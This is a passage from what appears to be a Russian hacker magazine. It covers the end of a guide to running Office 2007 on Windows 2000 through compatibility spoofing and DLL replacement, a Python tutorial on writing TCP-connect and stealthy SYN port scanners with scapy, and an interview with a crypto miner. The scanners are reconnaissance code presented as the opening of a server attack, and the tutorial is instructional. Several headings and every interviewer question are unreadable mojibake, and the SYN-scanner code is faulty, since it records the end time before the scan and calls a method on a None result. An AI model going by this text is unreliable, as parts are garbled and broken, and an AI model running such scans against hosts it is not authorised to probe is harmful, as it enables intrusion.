→ FullPack и заг рузи отту да архив с расширением .7z.





                        Скачиваем HFSLIP

Распакуй содержимое скачан ного архива в какую-нибудь папку на диске. Кро-
ме множества дирек торий, ты увидишь в этой папке исполняемый CMD-
файл — запусти его от имени администратора. Скрипт создаст несколь ко
новых дирек торий, среди которых будет папка SOURCE. Перемести в эту папку
все папки и файлы из распакован ного тобой образа диска Windows 2000.
   Теперь нам пред стоит времен но отключить в нашей системе UAC (User
Account Control): если мы этого не сделаем, каждая выполняемая HFSLIP опе-
рация будет сопровождать ся всплы вающим системным предупреждением
и нам придет ся нажимать «Да» боль ше 200 раз. Даже самому терпеливому
юзеру это очень быстро надоест. Для отключения UAC в Windows 10 нужно
сделать следующее. Открой панель поиска щелчком мыши на кнопке с изоб-
ражением лупы в панели задач, набери UAC и нажми появившийся значок
«Изменение парамет ров кон троля учет ных записей». Перемести ползунок вниз
в положение «Никог да не уведом лять» и нажми «Оk», затем под тверди
это действие в открывшемся окне.





                        От ключаем UAC

Теперь снова запусти файл .CMD в папке HFSLIP с правами администратора.
Тебе пред ложат выбрать,  как  интегрировать обновления  в дистрибутив
Windows 2000: добавить ком понен ты в DRIVERS.CAB с разной степенью ком -
прессии либо создать новый архив SPX.CAB так же с исполь зованием разной
степени сжатия. Я пред почел вариант А.





                Вы бираем режим работы HFSLIP

На следующем экране тебе пред ложат задать имя папки на слу чай, если ты
исполь зуешь муль тизаг рузочный ком пакт-диск. Этот шаг можно пропустить,
нажав клавишу Enter. Теперь нужно подождать, пока утилита HFSLIP завершит
свою работу — это займет некоторое время. Ког да все обновления будут
интегрированы, в папке с HFSLIP появит ся новая дирек тория SOURCESS, а в
ней — новый модифицирован ный дистрибутив Windows 2000, боль шего раз-
мера, чем исходный. C этим дистрибутивом мы и будем работать даль ше.


ÓÑÒÀÍÀÂËÈÂÀÅÌ WINDOWS 2000 È KERNELEX

Для начала нужно собрать обновлен ный дистрибутив в файл .ISO — это можно
сделать, например, с помощью бесплат ной прог раммы CDBurnerXP. Установи
и запусти прог рамму, перетащи все файлы дистрибутива в окно CDBurnerXP,
а затем выбери в меню «Файл» пункт «Сохранить проект как ISO-образ». Если
компь ютер, на который ты собираешь ся устанавливать Windows 2000, обо-
рудован оптическим приводом, можешь сразу записать этот образ на ком -
пакт-диск.





                    Сохраняем проект в образ ISO

Если оптического привода нет, получившийся образ нужно записать на флеш ку
с помощью прог раммы Rufus — не забудь сделать флеш ку заг рузочной!
Теперь нужно установить Windows 2000 c этого носителя на наш компь ютер.
Если  ты  все  сделал  правиль но,  установка  должна  пройти  стан дартно
без каких-либо сложностей.





                       Установка Windows 2000




                      Ес ли на твоем компе использует ся диск SATA (а
                        такие дис ки уста новлены практичес ки на всех
                       современных  компах  и  ноут буках),  Windows
                     2000 на него не вста нет из-за отсутс твия соот -
                        ветс тву ющего драй вера — на начальном эта пе
                        уста новки      ты      получишь     ошиб ку
                          inaccessible_boot_device. Этот драй вер при дет ся
                       пред варительно интегри ровать в дис три бутив.
                       Как это сделать, написа но на форуме Ru-Board ,
                     сам драй вер мож но взять на сай те разработ чика
                      или на портале Old-DOS.ru. Еще мож но поп-
                       робовать  добавить  драй вер  в  дис три бутив
                        с  помощью  ути литы  nLite  (работа ет  только
                        в Windows XP), но ни один из этих вари антов
                       не гарантиру ет стопроцентного успеха. На компь-
                     ютерах с дис ками IDE Windows 2000 уста новит ся
                       без вся ких пля сок с буб ном.


После завершения установки Windows 2000 необходимо установить KernelEx.
Чтобы при инсталляции не было проблем, лучше скопировать исполняемый
файл на рабочий стол и запускать его отту да. Если после запуска KernelEx
будет выдавать ошибки и жаловать ся на недоступность Shell32.dll, переза-
пусти Windows в SafeMode и установи KernelEx в этом режиме. Если прог рамма
попросит тебя выбрать режим работы KernelEx, установи флажок XP-compatible
winsock.




                        XP-compatible winsock необ ходим для пра виль-
                      ной работы Outlook 2007, но использование этой
                      опции  может  вызывать  зависа ние  бра узеров
                      и дру гих прог рамм. Если ты не пла ниру ешь уста -
                       навливать  Microsoft  Outlook, луч ше на вся кий
                        слу чай снять этот фла жок.


После установки KernelEx система перезаг рузит ся. Если тебе нужно исполь -
зовать несовместимые драйверы  XP, более 4 Гбайт оперативной памяти
или боль ше двух потоков процессора, придет ся дополнитель но установить
Extended Core — его так же можно скачать с сайта BlackWingCat или с
MSFN.org.


ÓÑÒÀÍÀÂËÈÂÀÅÌ OFFICE 2007

По умолчанию в Windows 2000 можно без проблем установить толь ко мораль -
но устаревший Oﬃce 2003, который не под держивает современ ные форматы
докумен тов. К сожалению, ничего новее Oﬃce 2007 поставить на эту систему
тоже не получит ся, да и в том будут работать далеко не все фун кции. Нап-
ример, ты сможешь просматривать зашифрован ные докумен ты, но у тебя
не будет возможности их редак тировать.




                      Ес ли  ты  уста новишь  Ofce 2007  опи санным
                       здесь  способом,  в  дальнейшем  уда лить  его
                       из Windows 2000 из панели  управления уже
                       не получит ся. Прог рамму при дет ся уда лять вруч -
                        ную, а затем чис тить реестр.


Итак,  для  начала  нам  пот ребу ется  распаковать  дистрибутив  Oﬃce
2007 на диск так же, как мы это делали рань ше с дистрибутивом Windows
2000. Это нужно делать на той машине под управлением Win2K, на которой ты
будешь его устанавливать.
   Заг рузи утилиту fcwin088 с сайта BlackWingCat , создай на системном диске
какую-нибудь папку, например C:\fcwin088, и распакуй в нее содержимое
CAB-файла. В даль нейшем тебе понадобят ся файлы NNN4NT5 из папки tools
и fcwin2k.
   Если ты теперь попробу ешь запустить «род ную» прог рамму установки
Oﬃce 2007, ничего не получит ся: setup.exe просто откажет ся работать. Вмес-
то этого запусти толь ко что распакован ное приложение fcwin2k — оно обма-
нывает установщик, заставляя его думать, что он работает в более поздней
версии Windows. В открывшемся окне нажми кнопку Refer рядом с File и найди
на диске  исполняемый файл  setup.exe  из дистрибутива Oﬃce  2007.
В выпадающем списке OS Ver выбери Windows XP SP3, нажми CompatSave,
а затем RunCompat.





                             Утилита fcwin2k

Теперь прог рамма setup.exe должна запустить ся нормаль но и начать уста-
новку Oﬃce. Скорее всего, ты не сможешь ввести ключ продук та (поле
для ввода ключа будет нек ликабель ным), поэтому просто нажми «Далее» —
серийник можно указать позже. В окне выбора ком понен тов откажись от уста-
новки Microsoft Groove — эта прог рамма не работает в Windows 2000. Все
осталь ное можно смело устанавливать.
  При желании установи Oﬃce 2007 Service Pack 3 — этот пакет обновлений
уже отсутству ет на официаль ном сайте Microsoft, но, по счастью, он сохранился
в Web Archive.
   Если теперь ты попробу ешь запустить любое приложение Oﬃce, то ты
получишь ошибку This program requires a newer version of Windows («Эта прог -
рамма требует более новой версии Windows»). Чтобы избавить ся от нее,
запусти приложение NNN4NT5 из ком плек та поставки fcwin088. Эта прог рамма
обманет систему: приложения будут считать, что они работают в Windows XP.
Дан ный трюк позволит тебе запускать более-менее современ ные прог раммы,
но вызовет проблемы, если ты захочешь установить специфичные для Win2K
приложения или ком понен ты  (например, дополнитель ный клиент Remote
Desktop Connection, не включен ный по умолчанию в Windows 2000).





                           Утилита NNN4NT5




                      Ес ли  тебе  нужен  кли ент  Remote  Desktop
                         Connection,  уста нови  его  ПЕРЕД  запус ком
                   NNN4NT5. Он отка жет ся работать, если будет
                        думать, что ты используешь XP, поэтому либо
                        уста навливай его заранее, либо верни внесенные
                        в сис тему с помощью NNN4NT5 изменения, уста -
                       нови RDC, а затем снова при мени NNN4NT5.


Мы проделали уже много манипу ляций с Oﬃce 2007, но, несмотря на это, он
все равно откажет ся работать — на сей раз из-за отсутствия библиотеки
msvcr90.dll. На самом деле ошибка msvcr90.dll could not be found свя-
зана с дру гой библиотекой — riched20.dll, которая отвечает за коррек тное
отображение тек ста в формате Rich Text Format (RTF), в том числе в окнах уста-
новки приложений. Имен но поэтому мы не мог ли ввести серийник на этапе
инсталляции Oﬃce.
   Ак туаль ную версию файла riched20.dll можно взять из HFSLIP — этот
файл в сжатом виде (riched20.dl_) лежит в папке \SOURCESS\I386. Саму
библиотеку можно извлечь из файла с помощью 7-Zip и заменить ею ори-
гиналь ный файл в C:\WINNT\system32. Если это не поможет решить проб-
лему, установи неофициаль ный SP 5.1 для Windows 2000 либо просто вытащи
отту да одну эту библиотеку и замени ей библиотеку в папке system32.
   Теперь осталось толь ко ввести ключ продук та, если ты не сделал этого
рань ше. Зак рой все приложения Oﬃce и снова запусти прог рамму установки.
Ког да на экране отобразит ся окно с пред ложением указать ключ продук та, вве-
ди в соот ветству ющее поле серийный номер и нажми «Далее» — спустя нес-
коль ко секунд прог рамма установки завершит свою работу, но теперь ключ
будет зарегистрирован в приложении.
  Шрифт по умолчанию в Microsoft Oﬃce 2007 — Colibri, который обычно
предустановлен в более поздних версиях Windows. Открой папку C:\WINNT\
system32\Fonts и убедись, что там присутству ет файл этого шрифта. Если
такой шрифт в системе не зарегистрирован, найди его в интернете, скачай
и установи на компь ютере.


Âêëþ÷àåì ïîääåðæêó çàøèôðîâàííûõ äîêóìåíòîâ
К этому момен ту Oﬃce 2007 в основном работает, и ты сможешь нормаль но
откры вать и сохранять файлы. Однако, скорее всего, у тебя не получит ся
откры вать докумен ты, зашифрован ные в новых версиях Oﬃce. Чтобы испра-
вить это, тебе нужно заменить некоторые DLL-файлы файлами для Windows XP.
Необходимые    библиотеки    можно     найти     в     обновлениях
KB3081320 и KB2868626.
  От крой Microsoft Update и заг рузи обновления KB3081320 для Windows XP
Embedded (Security Update  for WEPOS and POSReady 2009 (KB3081320)
Windows  XP  Embedded   Security   Updates,   11/9/2015,   719   Кбайт)
и KB2868626 для Windows XP (Security Update for Windows XP (KB2868626)
Windows XP, 11/11/2013, 754 Кбайт). Не устанавливай эти обновления — вместо
этого нужно извлечь библиотеки dssenh.dll, rsaenh.dll и schannel.dll
из обновления KB3081320 для POSReady и crypt32.dll из KB2868626.
  Ты не сможешь исполь зовать архиватор 7-Zip, чтобы извлечь исполняемые
файлы из пакетов обновлений. Вместо этого открой коман дную строку
и перейди в локаль ную папку, куда ты сохранил скачан ные апдейты. Затем
выполни следующую коман ду (пред полагается, что обновление заг ружено
для английской версии Windows):


windowsxp-kb2868626-x86-enu_
1a00424d2070b57a4d9e2e73e54d90f51bb0562a.exe /extract

В открывшемся окне нажми OK, чтобы извлечь файлы. Сделай то же самое
для дру гого обновления:


windowsxp-kb3081320-x86-embedded-enu_
d8e991e08445605d85c48425684c7850d1d63a36.exe /extract

Сохрани нужные DLL-файлы в какую-нибудь папку на диске, исходные файлы
обновлений теперь можно удалить. Очевид но, что Windows не позволит
заменить библиотеки, ког да операционная система заг ружена, поэтому вос-
поль зуйся каким-нибудь Live CD и замени эти библиотеки в папке C:\WINNT\
system32.




После замены библиотеки crypt32.dll новой версией зашифрован ные файлы
в Word и Excel будут откры вать ся нормаль но, но Microsoft Outlook, скорее все-
го, перестанет работать, посколь ку это приложение исполь зует старую версию
библиотеки. Если тебе все-таки нужен Outlook, сохрани оригиналь ную биб-
лиотеку crypt32.dll под именем crypt33.dll, скачай и установи редак тор
HxD, затем открой в нем файл C:\Program Files\Common Files\Microsoft
Shared\OFFICE12\MSO.dll, нажми CTRL-F для поиска crypt32. Должно най-
тись одно совпадение. Исправь crypt32 на crypt33 и сохрани файл.
  После этого при каждом откры тии Outlook будет появлять ся предупрежде-
ние о недействитель ном сертификате безопасности. Ты можешь отключить
предупреждение и продолжать поль зовать ся Outlook, но каждый раз при стар-
те прог раммы диалог вылезет.



ÔÈÍÀËÜÍÛÅ ØÒÐÈÕÈ

Фак тически Windows 2000 в таком виде уже можно поль зовать ся. Чтобы
интерфейс лучше воспринимался, щелкни правой кнопкой мыши на рабочем
столе, выбери Properties («Свойства»), перейди на вклад ку Eﬀects («Эффекты»)
и установи флажок Smooth edges of screen fonts («Сглаживать края экранных
шрифтов»).
   Для под держки сетей Wi-Fi с WPA2 в Windows 2000 рекомен дую скачать
и установить прог рамму WiFi Hopper с официаль ного сайта или с торрента.
Многие драйверы к Windows 2000 SP4 под ходят от ХР, род ные «дрова» все
еще можно найти в интернете или в веб-архиве.
  На моем Toshiba P35 Win2K кру тит ся доволь но быстро, Oﬃce 2007 поз-
воляет редак тировать докумен ты в современ ных форматах, Firefox — бродить
по сети (приш лось установить дополнения для под держки HTTPS), а вместо
почтового клиента я поставил The Bat. Получилась сим патичная пишущая
машин ка, которую можно отправить доживать свой век на  дачу,  чтобы
на досуге писать на ней статьи в «Хакер», а в свобод ное время — играть в UFO
и второй Warcraft.




                     •Пос ледние совмести мые с Windows 2000 вер-
                       сии популярного соф та
                     •Ана логич ный спи сок для сис темы с KernelEx
КОДИНГ





                        КАК НАПИСАТЬ
                     И УЛУЧШИТЬ
                    СОБСТВЕННЫЙ
                     СКАНЕР ПОРТОВ



С чего начина ется ата ка на сер вер? Пра -
вильно,  с  раз ведки!  Ска неров  пор тов
существу ет  мно жество,  и  они  быстро
и  эффектив но  справ ляют ся  со  сво ей
задачей. Но  настоящий  хакер  дол жен         Марк Клинтов                                                                          Не существует устройства,
понимать, как работа ют его любимые инс-       которое запретит людям                                                                                   быть идиотами
тру мен ты, так что сегод ня мы в учебных           vlad.klintov@mail.ru
целях напишем собствен ный ска нер, и я
расска жу, какие методы ска ниро вания луч -
ше никог да не использовать.


Сначала мы изу чим теоретическую часть: как вообще работает соединение,
как оно устанавливается и как можно исполь зовать эти механизмы. Тут я
покажу «плохую» реализацию сканера. Затем мы разберем сканер здорового
человека и реализуем его самостоятель но.


ÒÅÎÐÈß

Для начала посмотрим, как сетевые устройства взаимодейству ют друг с дру -
гом в классическом слу чае. Для этого исполь зуют ся сокеты, которые упрощен -
но можно изобразить как тру бы. При этом у каждой тру бы два кон ца — это и
есть сокеты. Один конец тру бы находит ся на одном компь ютере, дру гой —
на дру гом, а прог раммы могут что-то помещать в такие «тру бы» или читать
из них.
  Су ществу ет два типа сокетов: TCP и UDP. Они отличают ся тем, что происхо-
дит в пути от одного кон ца тру бы к дру гому. TCP-сокет гаран тиру ет, что пакеты
будут доставлены до дру гого кон ца тру бы в нужном поряд ке и без потерь —
если это вообще возможно, разумеется. А вот UDP-сокеты работают на ско-
рость и могут потерять или перепу тать пакеты по дороге.





                        Наг лядное объяснение

Видеосвязь,  например,  отлично  исполь зует  преиму щества  UDP.  Если
с каналом вдруг что-то не так, какие-то пакеты просто потеряются, а оставши-
еся дойдут в срок, и какая-никакая картинка все равно будет.


ÏÈØÅÌ ÑÊÀÍÅÐ ÍÀ ÑÎÊÅÒÀÕ

Этот сканер — самый простой и очевид ный. Чтобы узнать, какие порты откры -
ты, можно просто попробовать под ключить ся к ним поочеред но и посмотреть,
что будет.
  Все примеры кода привожу на Python 3.10, а работать я пред почитаю
в PyCharm, хотя и не навязы ваю тебе свой выбор.
  Создаем прог рамму и импортируем основные модули:


import socket
from datetime import datetime
import sys




                     Под робнее узнать о работе с модулем socket
                    мож но в офи циальной документации .


Запом ним время запуска прог раммы — в даль нейшем это пригодит ся, чтобы
узнать время сканирования.


start = datetime.now()

Хранить  пары  из портов  и  названий  сервисов будем  прямо  в  коде.
При желании можешь проапгрейдить этот метод, например до файлов JSON.


ports = {
    20: "FTP-DATA", 21: "FTP", 22: "SSH", 23: "Telnet",
    25: "SMTP", 43: "WHOIS", 53: "DNS", 80: "http",
    115: "SFTP", 123: "NTP", 143: "IMAP", 161: "SNMP",
    179: "BGP", 443: "HTTPS", 445: "MICROSOFT-DS",
    514: "SYSLOG", 515: "PRINTER", 993: "IMAPS",
    995: "POP3S", 1080: "SOCKS", 1194: "OpenVPN",
    1433: "SQL Server", 1723: "PPTP", 3128: "HTTP",
    3268: "LDAP", 3306: "MySQL", 3389: "RDP",
    5432: "PostgreSQL", 5900: "VNC", 8080: "Tomcat", 10000:
"Webmin" }

Преобразуем передан ный аргу мент в IP-адрес. Для этого скормим первый
аргу мент коман дной строки нашего сканера фун кции socket.gethostbyname(
string) — бонусом получим разрешение DNS, если передано домен ное имя,
а не IP-адрес.


host_name = sys.argv[1]
ip = socket.gethostbyname(host_name)

Теперь в цик ле обойдем все порты из списка и проверим возможность под -
ключения к ним. Если порт зак рыт, будет вызывать ся исключение, которое мы
перехватим, и прог рамма не вылетит.
  В кон це работы сохраняем время окон чания и выводим на экран длитель -
ность сканирования.


for port in ports:
  cont = socket.socket()
  cont.settimeout(1)
  try:
       cont.connect((ip, port))
  except socket.error:
       pass
  else:
       print(f"{socket.gethostbyname(ip)}:{str(port)} is open/{
ports[port]}")
         cont.close()
ends = datetime.now()
print("<Time:{}>".format(ends - start))
input("Press Enter to the exit....")

Теперь, чтобы протестировать работу нашего сканера, откроем терминал,
перейдем в папку со сканером и выполним коман ду


python.exe socket.py 45.33.32.156




                      Ес ли ты работа ешь на Linux, используй команду
                   python3, чтобы слу чай но не нарваться на уста -
                       ревший Python.


Само собой, вместо IP в примере можно указать любой хост.
  Давай посмотрим, как это выг лядит со стороны сервера. Для этого вос-
поль зуем ся старичком Netcat . Скачай его и запусти следующим образом:


ncat.exe -lnvp 123




                        Netcat может понадобиться внес ти в белый спи -
                        сок анти виру са или сог ласовать уста новку с кор-
                       поративной служ бой безопас ности. Netcat час то
                       используют хакеры, чтобы под нять шел лы в ском-
                       промети рованных сис темах, так что ругань анти -
                       виру са впол не оправданна.


В сосед нем терминале запускаем наш сканер изу чать наш собствен ный IP-
адрес. Посмотреть его можно в выводе коман ды ipconfig /all. В резуль тате
в окне с Netcat произойдет следующее.




                   Реакция Netcat на сканирование

На скрин шоте вид но, что было установлено полноцен ное соединение,  и,
конечно, в реаль ности любая прог рамма тоже это увидит, то есть незамет но
просканировать кого-то таким образом не получит ся.
   Так же давай теперь просканиру ем сервер scanme.nmap.org (имен но его IP
был в первом примере). Резуль таты будут выг лядеть примерно так:


Address: 45.33.32.156
45.33.32.156:22 is open/SSH
45.33.32.156:80 is open/http

Сканер нашел два откры тых порта — 22 и 80. Но если просканировать этот же
хост при помощи Nmap, увидим, что откры тых портов нам ного боль ше.


Nmap scan report for scanme.nmap.org (45.33.32.156)
Host is up (0.22s latency).
Not shown: 994 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
1720/tcp  open  h323q931
5060/tcp  open  sip
9929/tcp  open  nping-echo
31337/tcp open  Elite


Nmap done: 1 IP address (1 host up) scanned in 5.02 seconds

Почему так? Nmap проходит по значитель но боль шему списку портов, чем наш
сканер, и, соот ветствен но, видит боль ше. Если мы добавим эти порты в наш
сканер, он тоже их найдет.
  Понят но, что такой сканер вряд ли применим в реаль ных условиях, кроме
совсем уж экзотических: например,  ког да сканировать надо с машины,
на которую невозможно доставить полноцен ный сканер, но на которой уже
есть Python.
  Давай лучше попробу ем сделать сканер, который не станет так палить ся
и работать будет куда быстрее.


ÎÏÒÈÌÈÇÀÖÈÈ

Чтобы сделать наш сканер более эффективным и скрыт ным, нужно не устанав-
ливать соединение, ведь это требует целых три пакета (трехэтапное рукопо-
жатие) плюс дополнитель ное время, чтобы зак рыть соединение. Но как узнать,
открыт ли порт, не пытаясь под ключить ся?
  Оказывается, метод есть. Зак лючается он в том, что необязатель но завер-
шать все три этапа рукопожатия — тог да соединение не будет установлено,
а значит, не нужно будет и зак рывать его. Узнать, открыт ли порт, можно
в ответе на первый же пакет, отправленный серверу, так что здорово сэконо-
мишь время, если искусствен но делать неполное рукопожатие. Бонусом
получаем  скрыт ность:  если соединение не  установлено,  то  прог раммы
на целевой машине и не узнают, что их кто-то сканиру ет.
   Как работает трехэтапное рукопожатие? Сначала инициатор соединения
отправляет дру гой машине на интересу ющий порт пакет с флагом SYN. Если
порт открыт, должен прийти ответ с флагами SYN и ACK. Если порт зак рыт,
поведение может быть разным, но в нормаль ном слу чае в ответе должен быть
флаг RST.
   Если инициатор еще не раздумал откры вать соединение, он должен отпра-
вить еще один пакет, но уже толь ко с флагом ACK, после чего соединение
будет считать ся установленным.
  Ключевой момент тут в том, что отправлять финаль ный ACK совершенно
не обязатель но, так как узнаем статус порта мы уже после второго пакета,
а третий заберет у нас драгоцен ное время и лишит скрыт ности.
   Чтобы зак рыть соединение, нужно отправить пакет с флагами FIN и ACK.
Эта информация нам сегод ня не понадобит ся и нужна толь ко для более пол-
ного понимания, что происходит с TCP-соединением на разных этапах его жиз-
ни.


SYN-ÑÊÀÍÅÐ ÍÀ PYTHON

Создаем новый скрипт на Python и импортируем нужные модули:


from scapy.layers.inet import ICMP, IP, TCP, sr1
import socket
from datetime import datetime

Если ты получил ошибку вида ModuleNotFoundError:  No  module  named
'scapy', значит, нужно доустановить модуль scapy из PyPI: pip install
scapy.




                  Документация Scapy



В этот раз перед сканированием неплохо бы проверить, доступна ли целевая
машина. Для этого можно отправить ICMP Echo Request (в простонародье —
пинг):


start = datetime.now()


# Здесь проверяется, в сети ли сервер
def icmp_probe(ip):
    icmp_packet = IP(dst=ip) / ICMP()
    # Отправка и прием одного пакета
    resp_packet = sr1(icmp_packet, timeout=10)
    return resp_packet is not None

Теперь напишем саму фун кцию сканирования. Она будет обходить все порты,
слать SYN-пакеты и ожидать ответа.


def syn_scan(ip, ports):
    # Проходимся по каждому порту
    for port in ports:
        # Флаг S означает SYN-пакет
        syn_packet = IP(dst=ip) / TCP(dport=port, flags="S")
        # Время ожидания пакета можно ставить свое
        resp_packet = sr1(syn_packet, timeout=10)
        if resp_packet is not None:
            if resp_packet.getlayer('TCP').flags & 0x12 != 0:
                print(f"{ip}:{port} is open/{resp_packet.sprintf(
'%TCP.sport%')}")


ends = datetime.now()

Порт будет считать ся откры тым, если в ответном пакете установлены флаги
SYN и ACK (или хотя бы один из них).
   Чтобы узнать, какой сервис соот ветству ет какому порту, в этот раз мы
не будем изобретать свой список, а восполь зуем ся готовым, который предос-
тавляет сам  Scapy. Можно исполь зовать фун кцию resp_packet.show(),
в выводе которой указывается сервис, соот ветству ющий целевому порту.


###[ IP ]###
version   = 4
ihl       = 5
tos       = 0x0
len       = 44
id        = 0
flags     = DF
frag      = 0
ttl       = 57
proto     = tcp
chksum    = 0x71c4
src       = ip_цели
dst       = ip_атакующего
\ options   \
###[ TCP ]###
sport     = ssh
dport     = ftp_data
seq       = 986259409
ack       = 1
dataofs   = 6
reserved  = 0
flags     = SA
window    = 65535
chksum    = 0x6d61
urgptr    = 0
options   = [('MSS', 1436)]

Осталось всего ничего: скормить фун кции список портов для проверки
и реализовать ввод информации о цели. Этим и займет ся фун кция main. В этот
раз сделаем интерак тивный ввод адреса цели и пред варитель ную проверку
доступности цели перед сканированием.


if __name__ == "__main__":
    name = input("Hostname / IP Address: ")
    # Узнаем IP цели
    ip = socket.gethostbyname(name)
    # Обозначаем порты для сканирования
    ports = [20, 21, 22, 23, 25, 43, 53, 80,
             115, 123, 143, 161, 179, 443, 445,
             514, 515, 993, 995, 1080, 1194,
             1433, 1723, 3128, 3268, 3306, 3389,
             5432, 5060, 5900, 8080, 10000]
    # Перехватываем исключения в момент, когда заканчивается
кортеж
    try:
        # Если не удалось подключиться к серверу, выводим ошибку
        if icmp_probe(ip):
            syn_ack_packet = syn_scan(ip, ports)
            syn_ack_packet.show()
        else:
            print("Failed to send ICMP packet")
    except AttributeError:
        print("Scan completed!")
        print("<Time:{}>".format(ends - start))

В массив ports нужно записать порты, которые ты собираешь ся сканировать.
Необязатель но перебирать все: даже Nmap по умолчанию сканиру ет толь ко
топ-1000 самых популярных, а осталь ные усколь зают и от него, если явно
не зат ребовать полное сканирование (-p-).
  На последней итерации цик ла происходит ошибка (массив закан чивается),
а значит, можно исполь зовать это событие, чтобы сообщить о завершении
работы.
  Посколь ку мы теперь запрашиваем адрес в самом скрипте, его можно
запускать без всяких парамет ров.


python.exe synscaner.py

Если снова открыть Netcat и просканировать его, то сканер покажет откры тый
порт, но никакого под ключения не слу чит ся. Проверка на скрыт ность прой-
дена!



                   Пример работы SYN-сканера




                     Пол ный  код  смот ри  в  моем  репози тории
                       на  GitHub. Там  есть  и  доработ ки,  которые
                       не были рас смот рены в статье, например гра -
                     фичес кий интерфейс на PyQt.


Теперь давай просканим какой-нибудь публичный сервер (тот же scanme.
nmap.org) и при помощи Wireshark посмотрим, какие пакеты ходят. Запустим
Wireshark, а затем и сканирование.
   Чтобы не запутать ся и не утонуть в потоке информации, который извергает
Wireshark,  давай применим филь тр. Достаточно будет  показать  пакеты,
которые отправлены или получены от хоста с IP 45.33.32.156.


ip.addr == 45.33.32.156

После применения филь тра окно Wireshark выг лядит так.





                      Резуль таты филь трации

Первым в списке видим ICMP-пакет (пинг), который отправлялся для проверки
доступности. Даль ше идут пакеты с флагами RST/ACK  (зак рытые порты)
и SYN/ACK (откры тые порты).


ÇÀÊËÞ×ÅÍÈÅ

Сегод ня мы рассмот рели два метода сканирования: с установлением соеди-
нения и без него. За рам ками статьи осталось сканирование портов UDP, так
как оно нам ного сложнее и нужно реже. Тем не менее Scapy позволит реали-
зовать и его, если тебе это вдруг понадобит ся. Не забывай, что подобные
прог раммы — это в первую очередь опыт, а не замена готовым инстру мен там.
Имен но знание  того,  как все устроено внут ри, делает тебя настоящим
хакером!
GEEK





     ZEROCO0L О ПЕРЕХОДЕ ЭФИРА
     НА POS, СЕКРЕТНЫХ МОНЕТАХ
      И ДЕШЕВЫХ ВИДЕОКАРТАХ





ZeroCo0l — энту зиаст май нин га, зараба -
тыва ющий на сво ей фер ме из 80 виде-
окарт око ло 90 дол ларов в день. В пред -
дверии перехо да эфи ра на proof of stake
Даня Шепова лов погово рил с ним о том,        Даниил Шеповалов                                                                                                https://t.me/vecherniy_danya
чем зай мут ся май неры,  ког да май нить           aprilkey@gmail.com
эфир больше не получит ся, как искать
супер при быльные   сек ретные   монет ки
и  имеет  ли  смысл  нович кам  сей час
собирать май нинг-фер му с нуля.




                    Не забудь под писаться на телег рам-канал Дани
                    Шепова лова « Вечерний Даня », чтобы не пропус -
                         кать новые авторские матери алы, и заг лядывай
                       на danya.ru.



— Â ñåðåäèíå ñåíòÿáðÿ íà÷íåòñÿ ïåðåõîä Ethereum íà PoS. Òû
ìàéíèøü ýôèð? Êàê âîîáùå ýòî ñîáûòèå ñêàæåòñÿ íà ìàéíåðàõ?
— Ну, далеко не факт, что это произойдет в середине сен тября, наверняка
будут задержки, как это по классике происходит с эфиром из года в год.
   Насчет майнин га: да, в дан ный момент я майню эфир. Наверное, уже года
два никаких сек ретных монет мы не копали. Эфир стрелял неод нократ но, осо-
бен ный жор был в момент трен да DeFi, так как комиссия в сети эфира была
очень высокая, а получали ее майнеры.
  Вообще, я считаю, что переход эфирки на PoS очень позитивно скажет ся
на индустрии: наконец-то начнут пилить новые монеты имен но под 30-ю
или 40-ю серию, активизируют ся разработ чики, думаю, мы увидим пам пы
таких монет, как ETC, RVN, ZEC. Не эфиром единым, да и биток ник то не отме-
нял.
   Ну и как-то в целом достало это вечное чувство «ожидания поса» — толь ко
жути нагоняют. Сейчас около 83% всех GPU майнят эфир, эти мощности нужно
будет куда-то размазывать.


— Òàê, ïîãîäè, äàâàé ïîïîäðîáíåå, ïî÷åìó áóäóò ïàìïû ETC, RVN,
ZEC?
— Про памп этих монеток — это чисто личное мнение. Таким ребятам,
как AMD и Nvidia, нужно продавать свое железо. Я думаю, они и будут пам пить
какие-то из этих монет. Не финан совый совет ни в коем слу чае!




                    Памп (от pumping) — спла нированное и орга низо-
                       ванное повышение цены монеты.



— «30-þ èëè 40-þ ñåðèþ» — èìåþòñÿ â âèäó âèäåîêàðòû Nvidia?
— Да, карточки Nvidia. Майнинг на AMD я в прин ципе не рассмат риваю.


— À ÷òî íå òàê ñ AMD?
— Да все так, AMD хорошо пашут на Etchash и ETH. Карты AMD очень чувстви-
тель ны к настройкам разгона, а иног да и вовсе шить надо. У Nvidia в этом пла-
не нет проблем, зажевы вает любой алго.





— Ãåéìåðû æå íåíàâèäÿò ìàéíåðîâ çà òî, ÷òî òå ñêóïàþò
âèäåîêàðòû?
— Скорее всего. Совсем недавно карточки были в дефиците и стоили очень
дорого, но сейчас, я думаю, ситу ация резко поменяется, карт стало очень мно-
го на вторичке и по очень хорошим ценам.


— Èç-çà áëèçêîãî ïåðåõîäà ýôèðà íà PoS?
— Да, как обычно, причина одна — майнинг мертв, эфир на PoS. Просто все
отвыкли майнить, все стали ленивы ми или вовсе не знают, как залить кас-
томный майнер в линь, чтобы копать новую монету. Проще майнить эфир, ну
или продать карты.


— Êàêèå ìîíåòû òû ìàéíèøü? È ÷òî íàèáîëåå âûãîäíî ñåé÷àñ
ìàéíèòü?
— На proof of work у меня майнит ся четыре монеты. Ясное дело, это биток
и эфир, недавно взял потестить асики iPollo для Ethereum Classic, чувствую,
будет памп. Ну и по фану майню GRIN тоже на асиках, правда в соло.
   Если не считать сек ретных монет, наиболее выгод но сейчас майнить эфир
на карточках, ну можно дуалить с каким-нибудь алго параллель но. У разных
монет разные алгорит мы хеширования, например одни хороши под AMD, дру -
гие под Nvidia. От алгорит мов зависит и элек тропот ребление карты, и даже
износ. Есть холод ные алги, есть горячие.




                      Асик  (ASIC —  application  specic  integrated
                               circuit) — специальное оборудование для май -
                      нинга криптовалют.



— ×òî çà ñåêðåòíûå ìîíåòû?
— Сек ретные монеты — это те, про которые ник то не слы шал, они дают пер-
вое время сверхдоход ность, пока сложность не улетела в космос. Это особен -
но интересное время для майнин га соло.


— À êàê èõ íàõîäèòü?
— Все сек ретные монеты рождают ся в GitHub. Юзай поиск по ключевым сло-
вам!


— Ìàéíèíã âûãîäíåå, ÷åì ñòåéêèíã?
— Ну тут все считает ся в момен те, и очень многое зависит от проекта. Такие
гемы, как Solana или Graph, попадаются очень ред ко.


— À â ÷åì çàêëþ÷àåòñÿ èõ ãåìíîñòü?
— Сейчас для меня гем ность — это высокий доход за относитель но корот кий
срок: один-два года. «Соляна» и «Граф» в момен те пок рыли риски с головой.
